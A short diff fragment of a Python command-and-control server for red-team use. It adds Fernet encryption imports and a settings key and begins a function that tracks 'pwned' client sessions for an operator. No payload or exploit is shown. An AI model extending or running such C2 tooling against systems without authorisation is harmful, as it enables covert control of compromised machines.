@@ -1,17 +1,25 @@
+"""
+Command & Control Server Side Coding
+Author: Davood Yahay(D.Yakuza)
+"""
 from http.server import BaseHTTPRequestHandler, HTTPServer
+# Custom Features Import
 from colorama import Fore
 from urllib.parse import unquote_plus
-
-#Constants Variables Imports
-from settings import CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD ,RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT
-
 from inputimeout import inputimeout, TimeoutOccurred
+from cryptography.fernet import Fernet
+from base64 import urlsafe_b64encode
+
+# Settings Variables(Constants) Importing
+from settings import (CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
+                      RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT, KEY)
+
 
 def get_new_session():
     """Function to check if other sessions exist if none do Re-Initialize variables.
 	However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""
 
-    # this variables must be global, as they will often be updated via multiple session
+    # this variable must be global, as they will often be updated via multiple session
     global activeSession, pwnedDict, pwnedId
     # Delete Lost Connection Client from pwnedDict
     del pwnedDict[activeSession]
